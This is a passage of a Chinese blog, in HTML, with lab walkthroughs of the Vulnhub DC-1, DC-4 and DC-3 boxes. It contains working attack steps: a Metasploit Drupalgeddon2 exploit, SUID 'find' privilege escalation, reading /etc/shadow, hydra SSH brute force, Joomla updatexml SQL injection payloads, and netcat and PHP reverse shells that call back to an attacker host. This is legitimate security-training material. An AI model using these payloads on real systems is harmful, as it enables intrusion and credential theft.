+<p>查看选项，设置相关参数<br><img src="https://img-blog.csdnimg.cn/20190523231122428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">设置rhosts</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.248.152</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>成功获取shell<br><img src="https://img-blog.csdnimg.cn/20190523232130797.png" alt="在这里插入图片描述">获取交互式shell<br><img src="https://img-blog.csdnimg.cn/20190523232203708.png" alt="在这里插入图片描述"></p>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ls</span><br><span class="line">发现flag1 文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190523232358393.png" alt="在这里插入图片描述">搜索flag文件，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -name  flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190523232823474.png" alt="在这里插入图片描述">查看passwd文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190523232626814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现特别的用户，尝试去查看用户的目录<br>找到了一个flag4.txt,这里是作者迷惑你的一个flag，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd /home</span><br><span class="line">www-data@DC-1:/home$ ls</span><br><span class="line">flag4</span><br><span class="line">www-data@DC-1:/home$ cd /www-data@DC-1:/home/flag4$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">www-data@DC-1:/home/flag4$ cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it's not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>既然我们在普通用户下没有找到flag，我们只能去提权了</p>
+<p>查看shadow文件,发现权限不足</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190523233645786.png" alt="在这里插入图片描述"><br>查找系统中具有suid设置的所有文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190523234336213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里去查看了下大佬的骚思路，找到了find提权方式,成功拿到shell<br>说明提权方式,为什么我们会想到用find提权，作者在flag3也告诉了我们，所以如果大家要一步一步的走，请移步后面flag到flag3查找过程<br>利用find的权限，使用exec去执行一些root权限的命令。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ touch wxy</span><br><span class="line">www-data@DC-1:/var/www$ find / -name wxy -exec "whoami" \;</span><br><span class="line">www-data@DC-1:/var/www$ find / -name -exec "/bin/sh" \;</span><br><span class="line"># ls</span><br><span class="line"># cd /root</span><br><span class="line"># ls</span><br><span class="line"># cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you've enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190523234628328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 提权成功，但是我们怎么能满足于只拿到flag，接下来，就是寻找flag之旅</p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>这个比较好找，我直接ls了当前的目录就发现了<br><img src="https://img-blog.csdnimg.cn/20190523235318529.png" alt="在这里插入图片描述">查看flag1.txt</p>
+<p><img src="https://img-blog.csdnimg.cn/20190523235359943.png" alt="在这里插入图片描述"></p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>那么我们就去查看cms配置文件,顺便收获flag2<br>发现sites文件，逐步进入查看发现settings.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20190523235801197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看settings.php,获取到了flag2 和数据库密码<br><img src="https://img-blog.csdnimg.cn/20190523235920686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">登录数据库</p>
+<p><img src="https://img-blog.csdnimg.cn/20190524000305209.png" alt="在这里插入图片描述">查看当前数据库<br><img src="https://img-blog.csdnimg.cn/20190524000353118.png" alt="在这里插入图片描述"><br>查看表drupaldb<br><code>show tables from drupaldb;</code><br><img src="https://img-blog.csdnimg.cn/20190524000703263.png" alt="在这里插入图片描述"><br>查看users表中的信息，发现两个用户<br><img src="https://img-blog.csdnimg.cn/20190524001240308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">搜索drupal的加密方式，尝试破解或者置换密码<br>参考链接：<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin   </span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin 		hash: $S$DVoemoxFFm9/7b0MuI7NDlBLlzty2pkOYF8Noj/IkodVTd9u84qV</span><br></pre></td></tr></table></figure>
+
+<p>复制 加密的密码，去数据库修改</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users set pass ="$S$DVoemoxFFm9/7b0MuI7NDlBLlzty2pkOYF8Noj/IkodVTd9u84qV" where name="admin";</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>去网站登录<br><img src="https://img-blog.csdnimg.cn/20190524002525352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现flag3<br><img src="https://img-blog.csdnimg.cn/20190524002558428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">根据这个提示，在结合上面find具有suid的权限，我们去搜索提权可以获取到使用find提权去执行root权限，最后拿到最终flag。</p>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>这个在flag4用户目录下,我们切换到flag4目录下<code>cd /home/flag4</code><br><img src="https://img-blog.csdnimg.cn/20190524065908178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里还有一种做法，<br>我们刚开始如果发现了flag4 用户，可以尝试去爆破，我们推荐hydra这个神器，如果你没有爆破字典，可以把john的拿过来用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ hydra -l flag4 -P /home/wxy/Desktop/password_dict/Weak_password.txt ssh://192.168.248.152</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190524070708516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>爆破成功后，我们尝试登录拿到flag4</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ ssh flag4@192.168.248.152</span><br><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4@DC-1:~$ cat flag4.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190524070854357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="最终flag"><a href="#最终flag" class="headerlink" title="最终flag"></a>最终flag</h2><p>我们已经知道了find的特殊之处，使用find去获取shadow文件。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -name wxy -exec "/bin/sh" \;</span><br><span class="line"># cat /etc/shadow</span><br><span class="line">或者</span><br><span class="line">www-data@DC-1:/etc$ find /etc/shadow -exec cat &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190524072046561.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190524072409895.png" alt="在这里插入图片描述">我们尝试去解密，linux对密码是sha256的加密方式</p>
+<p>如果密码比较复杂，解密是费时有可能解不出来，我们查看对shadow的权限<br>发现root对其具有写权限，这里我们备份一份shadow，然后直接改里面的值，去登录<br><img src="https://img-blog.csdnimg.cn/20190524073726571.png" alt="在这里插入图片描述"><br>ps：这里想了几种办法都没用，大佬有更加骚的姿势，欢迎指点</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>重点是find提权<br>下来就是各种工具的熟练掌握</p>
+<hr>
+<p>永远不要停下你的步伐</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/Vulnhub之DC-1[find提权]/" data-id="ck1avz66i002gacv4zgccf440" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Suid-提权/">Suid 提权</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Vulnhub靶机之DC-4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/Vulnhub靶机之DC-4/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.045Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/靶机/">靶机</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/Vulnhub靶机之DC-4/">DC-4 复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Vulnhub-之-DC-4"><a href="#Vulnhub-之-DC-4" class="headerlink" title="Vulnhub 之 DC-4"></a>Vulnhub 之 DC-4</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入</p>
+<p>门的伙伴。</p>
+<p>还是按照常例看看作者是怎么描述的吧。</p>
+<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。</span><br><span class="line"></span><br><span class="line">必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。</span><br><span class="line"></span><br><span class="line">对于初学者来说，谷歌可能会有很大的帮助，但是你可以随时在@DCAU7发推给我寻求帮助，让你重新开始。但是请注意:我不会给你答案，相反，我会给你一个如何前进的想法。</span><br></pre></td></tr></table></figure>
+
+<p>所以说，谷歌真的很万能。O(∩<em>∩)O哈哈~</em></p>
+<h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>记得修改DC-4的网络为NAT模式</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali : 192.168.248.130</span><br><span class="line"></span><br><span class="line">DC-4 : 192.168.248.128</span><br></pre></td></tr></table></figure>
+
+<h2 id="靶机复现"><a href="#靶机复现" class="headerlink" title="靶机复现"></a>靶机复现</h2><ul>
+<li><p>扫描网段</p>
+<p><code>nmap -sn 192.168.248.0/24</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721142149.png" alt></p>
+<p>发现目标ip ： 192.168.248.128</p>
+</li>
+<li><p>扫描端口</p>
+<p><code>nmap -sS 192.168.248.128</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721143438.png" alt></p>
+</li>
+<li><p>尝试爆破ssh</p>
+<p><code>hydra  -l root -P /root/Desktop/weakpass.txt -t 5 ssh://192.168.248.128</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721144835.png" alt></p>
+<p>一般破解需要时间所以我就做一个演示</p>
+</li>
+<li><p>网站搜寻线索</p>
+<p>发现是一个登录框，</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721145420.png" alt></p>
+<p>并且没有登录限制，尝试爆破</p>
+<p>可以使用hydra爆破，这里我使用burp做测试</p>
+<p>设置为<code>Cluster bomb</code>,用户给admin和root ，密码采用弱口令字典这个网上挺多的，或者使用hydra的默认字典也可以，然后线程跑高点 ， 我这里给burp设置的20，大概不到一分钟就出来了。</p>
+</li>
+</ul>
+<p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721151611.png" alt></p>
+<p>  这里只要登录成功后之后的登录都是636了</p>
+<ul>
+<li><p>登录发现</p>
+<p>有三个命令可以运行，然后抓包查看发现可以在radio这块执行了系统命令，那么是否可以执行其他的命令</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721161839.png" alt></p>
+<p>尝试执行<code>whoami</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162107.png" alt></p>
+<p>既然可以执行一些简单的命令，我们就可以尝试去反弹shell</p>
+<p>命令：<code>nc -e /bin/sh 192.168.248.130 4444</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162638.png" alt></p>
+<p>获取交互模式</p>
+<p>命令：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>之后在home的jim目录下发现了一个旧密码的备份</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721163345.png" alt></p>
+<p>或许可以尝试用它去爆破ssh</p>
+<p>命令：<code>chydra  -L /root/Desktop/user.txt -P /root/Desktop/dc_pass.txt -t 5 ssh://192.168.248.128</code></p>
+<p>等待是漫长的，要有耐心</p>
+<p>终于出来了一个  用户名：<code>jim</code> 密码：<code>jibril04</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721172645.png" alt></p>
+<p>切换到jim用户下，打开mbox查看</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165049.png" alt></p>
+<p>有邮件，去mail下查看，发现了jim文件获取到jim的密码</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165234.png" alt></p>
+</li>
+<li><p>登录charles</p>
+<p>密码： <code>^xHhA&amp;hvim0y</code></p>
+<p>命令：<code>sudo -l</code>查看权限 发现可以不需要密码执行teehee</p>
+<p>百度得到提权方式</p>
+<p>1 通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171456.png" alt></p>
+<p>2 还有个2呢，多个想法多个活路</p>
+<p>通过添加用户到passwd，设置其权限，之后su 访问即可获得root</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171755.png" alt></p>
+<p>所以，最好不要给用户sudo权限，或者限制sudo权限的，这样才能保证网络安全</p>
+</li>
+</ul>
+<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>今天的靶机奉上各位看官，过程简单，主要掌握提权的思路和前期爆破的等待。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/Vulnhub靶机之DC-4/" data-id="ck1avz65p000lacv4u9etmnep" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/远程命令执行/">远程命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Vulnhub靶机之DC-3" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/Vulnhub靶机之DC-3/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.043Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/靶机/">靶机</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/Vulnhub靶机之DC-3/">Vulnhub之DC-3 joomla注入和ubutnu16.04 提权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Vulnhub靶机之DC-3"><a href="#Vulnhub靶机之DC-3" class="headerlink" title="Vulnhub靶机之DC-3"></a>Vulnhub靶机之DC-3</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p> 刚考完试，然而不能放弃对技术的热爱，又重新拾起了dc准备把他们6个做完  </p>
+<p> 今天介绍的是dc-3 ，来看看作者对他的评价</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">描述：</span><br><span class="line"></span><br><span class="line">DC-3是另一个专门建造的脆弱实验室，旨在获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">与之前的DC版本一样，这个版本在设计时考虑了初学者，虽然这一次，只有一个标志，一个入口点，根本没有线索。</span><br><span class="line">Linux技能和熟悉Linux命令行是必须的，基本渗透测试工具的一些经验也是必须的。</span><br><span class="line"></span><br><span class="line">对于初学者来说，谷歌可以提供很大的帮助，但是你总是可以在@ DCAU7上给我发信息以获得帮助，让你再次前行。 但请注意：我不会给你答案，相反，我会告诉你如何前进。</span><br><span class="line"></span><br><span class="line">对于那些有CTF和Boot2Root挑战经验的人来说，这可能不会花费你很长时间（实际上，你可能很容易花费不到20分钟）。</span><br><span class="line"></span><br><span class="line">如果是这种情况，并且如果您希望它更具挑战性，您可以随时重做挑战并探索获得根并获得旗帜的其他方式</span><br></pre></td></tr></table></figure>
+
+<h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>首先设置靶机为NAT模式,如果获取不到ip 删除网络适配器重新添加</p>
+<p>ip地址：</p>
+<blockquote>
+<p>kali： 192.168.31.225</p>
+<p>DC-3： 192.168.31.19</p>
+</blockquote>
+<h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><p>由于下载的靶机是vbox的使用的，在vmware上出现了一些小问题，所以耽搁了一点时间。</p>
+<p>解决方法： vmware打开kali并且vbox打开DC-3 或者都使用vbox去打开</p>
+<ul>
+<li><p>扫描网段</p>
+<p>命令：<code>nmap -sn 192.168.31.0/24</code></p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161450.png" alt></p>
+<ul>
+<li><p>扫描端口</p>
+<p>命令： <code>nmap -sS 192.168.31.19</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161610.png" alt></p>
+</li>
+<li><p>访问网站</p>
+<p>url: <a href="http://192.168.31.19" target="_blank" rel="noopener">http://192.168.31.19</a></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161821.png" alt></p>
+</li>
+<li><p>指纹获取</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161925.png" alt></p>
+</li>
+<li><p>看起来是joomla的cms，使用扫描工具跑一下</p>
+<p>这里使用kali自带的扫描工具</p>
+<p>命令： <code>joomscan -u http://192.168.31.19</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720162351.png" alt></p>
+<p>看来没有什么结果，在搜索的同时 ，我们尝试一些简单的操作，比如弱密码，sql注入，但是看起来情况不容乐观啥都没有，</p>
+<p>扫描结果出来了，看看扫描到了版本信息，后台</p>
+<p>版本信息： <code>Joomla 3.7.0</code></p>
+<p>后台目录： <code>http://192.168.31.19/administrator/</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720162744.png" alt></p>
+</li>
+<li><p>查找相关漏洞</p>
+<p>发现这个版本存在sql注入漏洞</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720163337.png" alt></p>
+<p>接下来就是复现一下了</p>
+</li>
+<li><p>通过搜索发现可以注入获取到hash密码</p>
+<p>参考链接： <a href="https://www.anquanke.com/post/id/86119" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86119</a></p>
+<p>这里先借用工具试试： <a href="https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py</a></p>
+<p>复制到本地，然后执行命令:<code>python joomblah.py http://192.168.31.19</code></p>
+<p>获取到user的信息</p>
+<p><code>Found user [&#39;629&#39;, &#39;admin&#39;, &#39;admin&#39;, &#39;freddy@norealaddress.net&#39;,&#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39;, &#39;&#39;, &#39;&#39;]</code></p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720165327.png" alt></p>
+<p>​    手工注入</p>
+<p>​    获取hash 或者可以获取session来登录</p>
+<p>​    附上poc 参考链接: <a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/42033</a></p>
+<p>​    using sqlmap</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p>1获取当前的用户</p>
+<p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)</p>
+<p>​    也可以获取最近登录的session 这样也可以登录后台</p>
+<p>​    2 获取版本</p>
+<p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(version())),0)</p>
+<p>​    <code>XPATH syntax error: &#39;&gt;5.7.25-0ubuntu0.16.04.2</code></p>
+<p>​    3 查数据库</p>
+<p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(database())),0)</p>
+<p>​    <code>XPATH syntax error: &#39;&gt;joomladb&#39;</code></p>
+<p>​    参考链接</p>
+<p>​    <a href="https://www.jianshu.com/p/76451380b129" target="_blank" rel="noopener">https://www.jianshu.com/p/76451380b129</a></p>
+<p>​    4 获取表</p>
+<p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3a,    (SELECT(concat(0x3e,TABLE_NAME))FROM(information_schema.tables) where table_schema like         database() LIMIT 1,1),0x3a),1)</p>
+<p>​    但是获取的没有前缀</p>
+<p>​    我们通过16进制去获取到完整的表名，然后在通过转换获取到他的字符串</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720202649.png" alt></p>
+<p>​    5 获取列名<br>    UpdateXML(2,concat(0x3a,(SELECT(concat(COLUMN_NAME))FROM(information_schema.COLUMNS) WHERE TABLE_NAME LIKE 0x6c6d6278635f636f6e74656e7474 LIMIT 0,1),0x3a),1)</p>
+<ul>
+<li><p>登录</p>
+<p>破解hash值录<code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code><br>爆破得到密码： snoopy</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720204736.png" alt></p>
+</li>
+<li><p>寻找上传点</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720205802.png" alt></p>
+</li>
+<li><p>反弹shell</p>
+<p>写入代码</p>
+<p><code>&lt;?php system(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 1337 &gt;/tmp/f’); ?&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720210056.png" alt></p>
+</li>
+<li><p>kali 监听 获取shell</p>
+<p>这里切记一定要在同一个网段下，虽然两个网段也能通信但是shell反弹失败</p>
+<p>获取交互模式</p>
+<p><code>python &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>注意： 如果交互模式不成功，就换个文件名或者换个路径重新反弹交互shell</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720213055.png" alt></p>
+</li>
+</ul>
